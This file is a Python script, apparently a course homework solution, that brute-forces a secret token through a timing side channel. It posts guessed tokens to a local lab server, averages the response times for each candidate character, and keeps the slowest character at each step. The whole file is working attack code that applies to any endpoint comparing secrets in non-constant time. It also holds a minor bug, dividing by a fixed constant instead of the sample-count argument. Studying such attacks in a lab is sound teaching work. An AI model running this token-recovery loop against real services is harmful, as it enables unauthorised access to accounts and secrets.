import requests
import string
import numpy as np
from tqdm import tqdm

ALPHABET = 'abcdefghijklmnopqrstuvwxyz' + string.digits
N = 5
MIN_LEN = 2
MAX_LEN = 12


def guessing(prefix='', n=N):
    curr_pass = prefix
    for _ in range(MIN_LEN, MAX_LEN):
        execution_times = np.zeros(len(ALPHABET))
        for _ in tqdm(range(n)):
            for i, char in enumerate(ALPHABET):
                test_pass = curr_pass + char + 'a' * (MAX_LEN - len(curr_pass) - 1)
                response = requests.post("http://0.0.0.0:8080/hw6/ex1", json={"token": test_pass})
                
                execution_time = response.elapsed.total_seconds()
                execution_times[i] += execution_time
        execution_times /= N
        for i, time in enumerate(execution_times):
            print(f'{ALPHABET[i]}: {time:.3f}', end=' ')
        print()
        curr_char = np.argmax(execution_times)
        curr_pass += ALPHABET[curr_char]
        print(f'Curr pass: {curr_pass}')
    response = requests.post("http://0.0.0.0:8080/hw6/ex1", json={"token": curr_pass})
    print(response.text)
    print(response)
            


def calibrate(prefix='', n=N):
    execution_times = np.zeros(len(ALPHABET))
    # b4
    for _ in tqdm(range(n)):
        for i, char in enumerate(ALPHABET):
            # 'a' a dummy letter to continue the check
            curr_pass = prefix + char + ('a' * (MAX_LEN - len(prefix) - 1))
            response = requests.post("http://0.0.0.0:8080/hw6/ex1", json={"token": curr_pass})
            execution_time = response.elapsed.total_seconds()
            execution_times[i] += execution_time
    execution_times /= N
    print(execution_times)
    curr_char = np.argmax(execution_times)
    print(f'Most common char {ALPHABET[curr_char]}, execution time: {execution_times[curr_char]:.4f}')
    

if __name__ == "__main__": 
    print(ALPHABET)
    calibrate(n=50)
    calibrate(prefix='b', n=50)
    guessing(prefix='b4')
